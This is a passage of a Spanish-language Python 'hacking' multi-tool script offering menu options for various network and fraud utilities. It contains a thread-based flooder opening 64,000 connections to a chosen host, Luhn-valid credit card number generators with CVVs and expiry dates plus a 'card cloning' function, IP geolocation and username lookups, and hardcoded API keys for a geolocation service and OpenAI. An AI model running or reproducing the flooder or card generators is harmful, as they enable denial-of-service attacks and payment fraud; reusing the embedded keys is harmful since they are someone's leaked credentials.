		        print('[*] Conexión establecida') 
		        while True:
		            data = conn.recv(BUFFER_SIZE)
		            
		            if not data:
		                break
		            else:
		                print('[*] Datos recibidos: {}'.format(data.decode('utf-8'))) 
		            conn.send(data)        
elif choice == 23:
	os.system("clear")
	a(RR+"█▀▀█ █▀▀█ █▀▀█ █▀▀▄ █▀▀▀█")
	a(RR+"█░░░ █▄▄█ █▄▄▀ █░▒█ ▀▀▀▄▄")
	a(RR+"█▄▄█ █░▒█ █░▒█ █▄▄▀ █▄▄▄█")
	def auten():
		b = False
		a = input("contraseña: ")
		if a == "axelxs#30":
			b = True
		if b == True:
			print("contraseña correcta")
		if b == False:
			while True:
				print("contraseña incorrecta [CTR+C] para salir")
				os.system("clear")
	auten()			
	def ew():
		import random
		from randomtimestamp import randomtimestamp
		import sys
		import os
		from datetime import datetime
		from time import sleep
		SS = "\033[32;m"
		def a(s):
		        for c in s + '\n':
		                sys.stdout.write(c)
		                sys.stdout.flush()
		                time.sleep(1./170)
		00
		#p = float(input("targetas visa que desea generar: "))
		class CC():
		  '''Individual card info and methods.
		  '''
		
		
		  CCDATA = {
		    'amex': {
		      'len_num': 15,
		      'len_cvv': 4,
		      'pre': [34, 37],
		      'remaining': 13
		    },
		    'discover': {
		      'len_num': 16,
		      'len_cvv': 3,
		      'pre': [6001],
		      'remaining': 12
		    },
		    'mc': {
		      'len_num': 16,
		      'len_cvv': 3,
		      'pre': [51, 55],
		      'remaining': 14
		    },
		    'visa13': {
		      'len_num': 13,
		      'len_cvv': 3,
		      'pre': [4],
		      'remaining': 12
		    },
		    'visa16': {
		      'len_num': 16,
		      'len_cvv': 3,
		      'pre': [4],
		      'remaining': 15
		    },    
		  }
		
		  def __init__(self):
		    self.cc_type = None
		    self.cc_len = None
		    self.cc_num = None
		    self.cc_cvv = None
		    self.cc_exp = None
		    self.cc_prefill = []
		
		  def generate_cc_exp(self):
		    '''Generates a card expiration date that is 
		    between 1 and 3 years from today. Sets `cc_exp`.
		    '''
		    self.cc_exp = randomtimestamp(
		        start_year = datetime.now().year + 1,
		        text = True,
		        end_year = datetime.now().year + 3,
		        start = None,
		        end = None,
		        pattern = "%m-%Y")
		    
		  def generate_cc_cvv(self):
		    '''Generates a type-specific CVV number.
		    Sets `cc_cvv`. 
		    '''
		    this = []
		    length = self.CCDATA[self.cc_type]['len_cvv']
		
		    for x_ in range(length):
		      this.append(random.randint(0, 9))
		
		    self.cc_cvv = ''.join(map(str,this))
		
		  def generate_cc_prefill(self):
		    '''Generates the card's starting numbers
		    and sets `cc_prefill`.
		    '''
		    this = self.CCDATA[self.cc_type]['pre']
		    self.cc_prefill = random.choices(this)
		
		  def generate_cc_num(self):
		    '''Uses Luhn algorithm to generate a theoretically 
		    valid credit card number. Sets `cc_num`. 
		    ''' 
		    remaining = self.CCDATA[self.cc_type]['remaining']
		    working = self.cc_prefill + [random.randint(1,9) for x in range(remaining - 1)] 
		
		    check_offset = (len(working) + 1) % 2
		    check_sum = 0
		
		    for i, n in enumerate(working):
		      if (i + check_offset) % 2 == 0:
		        n_ = n*2
		        check_sum += n_ -9 if n_ > 9 else n_
		      else:
		        check_sum += n
		
		    temp = working + [10 - (check_sum % 10)]
		    self.cc_num = "".join(map(str,temp)) 
		
		  def return_new_card(self):
		    '''Returns a dictionary of card details.
		    '''
		    return {'cc_type': self.cc_type,
		            'cc_num': self.cc_num, 
		            'cc_cvv': self.cc_cvv,
		            'cc_exp': self.cc_exp}
		
		  def print_new_card(self):
		    '''Prints a single card to console.
		    '''
		    hr = '--------------------------------'
		    
		    print('Number: %s' % self.cc_num, 'CVV: %s' % self.cc_cvv, 'Exp: %s' % self.cc_exp)
		
		
		class CCNumGen(): 
		  '''Generates theoretically valid credit card numbers
		  with CVV and expiration date. Prints a list of dictionaries. 
		  '''
		#  hr = '--------------------------------'
		
		  card_types = ['amex','discover','mc','visa13','visa16']
		
		  def __init__(self, type='visa16', number=1):
		
		    self.type = type
		    self.num = number
		    self.card_list = []
		
		    if self.type not in self.card_types:
		      print('Card type not recognized. Task ended.')
		      return
		    if not isinstance(self.num, int):
		      print('Number of cards must be a whole number. Task ended.')
		      return
		
		    #print(self.hr)
		    
		
		    for x_ in range(0, self.num):
		      new = CC()
		      new.cc_type = self.type
		      new.generate_cc_exp()
		      new.generate_cc_cvv()
		      new.generate_cc_prefill()
		      new.generate_cc_num()
		      self.card_list.append(new.return_new_card())
		      new.print_new_card()
		
		  #  print(self.hr)
		   # print('Task complete.')
		#    print(self.hr)
		
		  def print_card_list(self):
		    '''Prints the list of cards to console.
		    '''
		    for d in self.card_list:
		     # print('------------------------------')
		      for k in d:
		        print(f'%s: %s' % (k, d[k]))
		print("exit [CTR+C]")
		w = int(input("1.-VISA\n2.-AMEX\n3.-MASTERCARD\n4.-DISCOVER\nSeleccione una opsion: "))
		u = float(input("Tiempo de retraso: "))
		if w == 1:
			while True:
				sleep(u)
				visa16 = CCNumGen('visa16', 1)
		elif w == 2:	
			while True:	
				sleep(u)
				amex = CCNumGen('amex', 2)
		elif w == 4:
			while True:
				sleep(u)
				discover = CCNumGen('discover', 2)
			
		elif w == 3:
			while True:
				sleep(u)
				mc = CCNumGen('mc', 2)
	ew()		                                                                                                  
elif choice == 24:
	
	web = input("dominio web: ")
	def a():
		while True:
			verbose_ping(web)
	print(a())
			                                                                                 
elif choice == 25:
	IP = input("IP: ")
	def geolocalizar_ip(ip):
	    api_key = "1291210a7e0842c59edaeeb6ae1d0f7f" 
	    url = f"https://api.ipgeolocation.io/ipgeo?apiKey={api_key}&ip={ip}"
	
	    try:
	        response = requests.get(url)
	        data = response.json()
	
	        
	        country = data["country_name"]
	        city = data["city"]
	        latitude = data["latitude"]
	        longitude = data["longitude"]
	        zipcode = data["zipcode"]
	        country_flag = data["country_flag"]
	        isp = data["isp"]
	        geoname_id = data["geoname_id"]
	        print("Información de geolocalización:")
	        print(f"País: {country}")
	        print(f"Ciudad: {city}")
	        print(f"Latitud: {latitude}")
	        print(f"Longitud: {longitude}")
	        print(f"Zipcode: {zipcode}")
	        print(f"Country_flag: {country_flag}")
	        print(f"isp: {isp}")
	        print(f"geoname_id: {geoname_id}")
	        
	    except requests.exceptions.RequestException as e:
	        print("Ocurrió un error al realizar la solicitud:", e)
	
	
	geolocalizar_ip(IP)
	
elif choice == 26:

	a(RR+"█▀▀▀█ █▀▀█ █▀▀▀ █▄░▒█ █▀▀█ ▀█▀")
	a(RR+"█░░▒█ █▄▄█ █▀▀▀ █▒█▒█ █▄▄█ ░█░")
	a(RR+"█▄▄▄█ █░░░ █▄▄▄ █░░▀█ █░▒█ ▄█▄")
	a(RR+"recuerda q la apikey tuya es opsional para poder usarlo mas eficas debes cambiarla")
	hold = input("vas a poner una api-key [y/n]?")
	if hold == "y":
		openai.api_key = input("api key: ")
	elif hold == "n":
		openai.api_key ='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'
	def hola():
		
		
		
		def interact_with_chatgpt(prompt):
		    response = openai.Completion.create(
		        engine='text-davinci-003',
		        prompt=prompt,
		        temperature=0.7,
		        max_tokens=4000,
		        top_p=1.0,
		        frequency_penalty=0.0,
		        presence_penalty=0.0
		    )
		    return response.choices[0].text.strip()
		
		
		while True:
		    user_input = input("axelxs: ")
		    prompt = f"Usuario: {user_input}\nAI:"
		    response = interact_with_chatgpt(prompt)
		    print("AI: " + response)
	hola()
	


elif choice == 27:
	url = input("URL: ")
	
	response = requests.get(url)
	
	if response.status_code == 200:
	    html_content = response.text
	    soup = BeautifulSoup(html_content, 'html.parser')
	    links = soup.find_all('a')
	    for link in links:
	        print(link.get('href'))
	else:
	    print('Error al realizar la solicitud HTTP')
	


elif choice == 28:
	os.system("clear")
	a(RR+"█▀▀▄ █▀▀▄ █▀▀▀█ █▀▀▀█ ▀█░█▀ █▀█")
	a(RR+"█░▒█ █░▒█ █░░▒█ ▀▀▀▄▄ ░█▄█░ ░▄▀")
	a(RR+"█▄▄▀ █▄▄▀ █▄▄▄█ █▄▄▄█ ░░▀░░ █▄▄")
	destino = input("IP O HOSTNAME: ")
	port = float(input("PORT: "))
	def enviar_datos():
	    target_host = destino
	    target_port = port
	
	    
	    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	    try:
	        # Establecer la conexión al destino
	        client_socket.connect((target_host, target_port))
	        print("Conexión establecida.")
	
	        # Enviar datos de 1200 bytes
	        data = b"A" * 1200  # Generar datos de 1200 bytes
	        client_socket.send(data)
	        print("Datos enviados:", len(data))
	
	        
	        response = client_socket.recv(4096)
	        print("Respuesta recibida:\n", response.decode())
	
	    except socket.error as e:
	        print("Error al conectar o enviar datos:", str(e))
	
	    finally:
	        
	        client_socket.close()
	        print("Conexión cerrada.")
	
	
	num_conexiones = 64000 
	hilos = []
	
	for _ in range(num_conexiones):
	    hilo = threading.Thread(target=enviar_datos)
	    hilos.append(hilo)
	    hilo.start()
	
	
	for hilo in hilos:
	    hilo.join()
elif choice == 29:
	a = input("archivo: ")
	a = f"/storage/emulated/0/{a}"
	archivo = open(a,"r")
	 
	for lineas in archivo.readlines() :
	    print(lineas)
	 
	archivo.close()

elif choice == 30:

		
	ops = int(input("1.-Crear una sqlite\n2.-Ejecutar una sqlite\nSeleccione una opsion: "))
	if ops == 1:
	
	
		
		ba = input("nombre de la db: ")
		print("el nombre de la tabla usada es 'tabla1'")
		def crear_conexion():
		    conexion = None
		    try:
		        conexion = sqlite3.connect(ba)
		        print("Conexión a la base de datos SQLite exitosa.")
		    except Error as e:
		        print("Error al crear la conexión a la base de datos:", e)
		    return conexion
		
		
		def crear_tabla(conexion):
		    try:
		        cursor = conexion.cursor()
		        cursor.execute("CREATE TABLE IF NOT EXISTS tabla1(id INTEGER PRIMARY KEY AUTOINCREMENT, nombre TEXT)")
		        print("Tabla creada exitosamente.")
		    except Error as e:
		        print("Error al crear la tabla:", e)
		
		
		def insertar_nombre(conexion, nombre):
		    try:
		        cursor = conexion.cursor()
		        cursor.execute("INSERT INTO tabla1 (nombre) VALUES (?)", (nombre,))
		        conexion.commit()
		        print("Nombre insertado exitosamente.")
		    except Error as e:
		        print("Error al insertar el nombre:", e)
		
		
		conexion = crear_conexion()
		#if conexion is not None:
		def d():
		    crear_tabla(conexion)
		    nombre = input("contenido: ")
		    #nombre2 = ("hola2")
		    #nombre3 = ("hola3")
		    insertar_nombre(conexion, nombre)
		    #insertar_nombre(conexion, nombre2) 
		    #insertar_nombre(conexion, nombre3)    
		while True:
			d() 	
		
		conexion.close()	
		
	elif ops == 2:
	
			
		
		
		bas = input("nombre de la db: ")
		def abrir_conexion():
		    conexion = None
		    try:
		        conexion = sqlite3.connect(bas)
		        print("Conexión a la base de datos SQLite exitosa.")
		    except Error as e:
		        print("Error al abrir la base de datos:", e)
		    return conexion
		
		
		def mostrar_contenido(conexion, consulta):
		    try:
		        cursor = conexion.cursor()
		        cursor.execute(consulta)
		        filas = cursor.fetchall()
		        for fila in filas:
		            print(fila)
		    except Error as e:
		        print("Error al ejecutar la consulta:", e)
		
		
		conexion = abrir_conexion()
		if conexion is not None:
		    consulta = "SELECT * FROM tabla1"  
		    mostrar_contenido(conexion, consulta)
		    conexion.close()
elif choice == 31:
	
	
	
	def obtener_ip_publica():
	    try:
	        response = requests.get('https://httpbin.org/ip')
	        data = response.json()
	        ip_publica = data['origin']
	        return ip_publica
	    except requests.exceptions.RequestException:
	        return None
	
	ip = obtener_ip_publica()
	
	print(ip)
	
elif choice == 32:


	wert = int(input("1.-Generador de targetas\n2.-Bineador\n3.-codigos de debito\nSelecciona una opsion: "))
	if wert == 1:
		def generar_tarjeta_debito():
		  tipo_tarjeta = "debito"
		  bin_debito = "400000"
		  
		  digitos_aleatorios = ''.join([str(random.randint(0,9)) for num in range(0,6)])
		  numero_tarjeta = bin_debito + digitos_aleatorios
		  
		  dgv_debito = calcular_dgv(numero_tarjeta)
		  numero_tarjeta_dgv = numero_tarjeta + str(dgv_debito)
		  print(f"Tu tarjeta de débito es: {numero_tarjeta_dgv}")
		  #print(numero_tarjeta_dgv)
		
		
		def generar_tarjeta_credito():
		  tipo_tarjeta = "credito"
		  bin_credito = "400001"
		  
		  digitos_aleatorios = ''.join([str(random.randint(0,9)) for num in range(0,6)])
		  numero_tarjeta = bin_credito + digitos_aleatorios
		  
		  dgv_credito = calcular_dgv(numero_tarjeta)
		  numero_tarjeta_dgv = numero_tarjeta + str(dgv_credito)
		  print(f"Tu tarjeta de crédito es: {numero_tarjeta_dgv}")
		  #print(numero_tarjeta_dgv)
		
		
		def calcular_dgv(numero_tarjeta):
		
		  lista_numeros = [int(x) for x in str(numero_tarjeta)]
		
		  lista_numeros_invertida = lista_numeros[::-1]
		
		  for i in range(0, len(lista_numeros_invertida), 2):
		    lista_numeros_invertida[i] *= 2
		
		  for i in range(len(lista_numeros_invertida)):
		    if lista_numeros_invertida[i] > 9:
		      lista_numeros_invertida[i] -= 9
		
		  suma_numeros = sum(lista_numeros_invertida)
		
		  dgv = 0
		  if suma_numeros % 10 != 0:
		    dgv = 10 - (suma_numeros % 10)
		  return dgv
		
		ter = int(input("1.-Debito\n2.-Credito\nSeleccione una opsion: "))
		tie = float(input("tiempo de retraso: "))
		if ter == 1:
			while True:
				sleep(tie)
				generar_tarjeta_debito()
		if ter == 2:
			while True:
				sleep(tie)
				generar_tarjeta_credito()
	
	elif wert == 2:
	
	
		def cloneCard(cardNumber):
		    regex = re.compile("^[0-9]{16}$")
		    if not regex.match(cardNumber):
		        print("Error: Card number is invalid")
		        return
		
		    clonedNumber = ""
		    for i in range(len(cardNumber)):
		        if i == 0:
		            clonedNumber += cardNumber[i]
		        elif i == 4 or i == 8 or i == 12:
		            clonedNumber += cardNumber[i]
		        else:
		            clonedNumber += str(int(cardNumber[i]) + 1)
		
		    print("Cloned card number is: " + clonedNumber)
		
		cardNumber = input("Enter card number: ")
		cloneCard(cardNumber)
	
											
	elif wert == 3:																																								
		tem = float(input("tiempo de retraso: "))
		def qwe():
			def generar_codigo_tarjeta(monto):
			    codigo_tarjeta = ""
			    char_list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]
			
			    for i in range(6):
			        codigo_tarjeta += random.choice(char_list) + str(random.randint(0,9))
			
			    codigo_tarjeta += str(monto)
			
			    return codigo_tarjeta
			
			# Uso de la función
			codigo_tarjeta = generar_codigo_tarjeta(500)
			print("El código de tarjeta de débito es:", codigo_tarjeta)
		
		while True:
			sleep(tem)
			qwe()
									

elif choice == 33:
		
	def search_on_facebook(username):
	
	    return None
	
	def search_on_tiktok(username):
	    url = f'https://www.tiktok.com/@{username}'
	    response = requests.get(url)
	    if response.status_code == 200:
	        return f'TikTok: {url}'
	    return None
	
	def search_on_twitter(username):
	    url = f'https://twitter.com/{username}'
	    response = requests.get(url)
	    if response.status_code == 200:
	        return f'Twitter: {url}'
	    return None
	
	def search_on_instagram(username):
	    url = f'https://www.instagram.com/{username}'
	    response = requests.get(url)
	    if response.status_code == 200:
	        return f'Instagram: {url}'
	    return None
	
	def search_on_github(username):
	    url = f'https://github.com/{username}'
	    response = requests.get(url)
	    if response.status_code == 200:
	        return f'GitHub: {url}'
	    return None
	
	def main():
	    username = input("Ingresa el nombre de usuario a verificar: ")
	
	    results = []
	
	    tiktok_result = search_on_tiktok(username)
	    if tiktok_result:
	        results.append(tiktok_result)
	
	    twitter_result = search_on_twitter(username)
	    if twitter_result:
	        results.append(twitter_result)
	
	    instagram_result = search_on_instagram(username)
	    if instagram_result:
	        results.append(instagram_result)
	
	    github_result = search_on_github(username)
	    if github_result:
	        results.append(github_result)
	
	    facebook_result = search_on_facebook(username)
	    if facebook_result:
	        results.append(facebook_result)
	
	    if results:
	        print(f"Se encontraron coincidencias para '{username}':")
	        for result in results:
	            print(result)
	    else:
	    	print(f"No se encontraron coincidencias para '{username}' en las redes sociales")
	
	if __name__ == "__main__":
	    main()





																							    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               						    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               							    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               						    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               					    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                               							    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               						    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               																							    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               						    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               							    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               						    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               					    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                               							    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               						    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               	    			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
